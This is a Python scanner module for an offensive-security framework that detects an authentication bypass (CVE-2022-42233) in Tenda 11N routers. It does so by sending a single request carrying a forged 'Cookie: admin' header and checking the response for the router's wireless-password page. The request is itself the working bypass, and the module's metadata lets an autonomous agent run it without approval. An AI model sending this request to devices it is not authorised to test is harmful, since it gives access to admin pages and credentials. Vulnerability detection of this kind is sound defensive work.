#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tenda 11N with firmware version V5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tenda 11N - Authentication Bypass Detection',
        'description': 'Tenda 11N with firmware version V5.07.33_cn contains an authentication bypass vulnerability. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'tenda', 'auth-bypass', 'router', 'iot', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/D0ngsec/vulns/blob/main/Tenda/Tenda_11N_Authentication_Bypass.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-42233',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Henry4E36/POCS',
        ],
        'cve': 'CVE-2022-42233',
    }

    def run(self):
        path = '/index.asp'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'admin'})
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        body_all = ('def_wirelesspassword', 'tenda 11n',)
        header_any = ('goahead-webs',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Tenda 11N - Authentication Bypass detected', path=path)
            return True
        return False

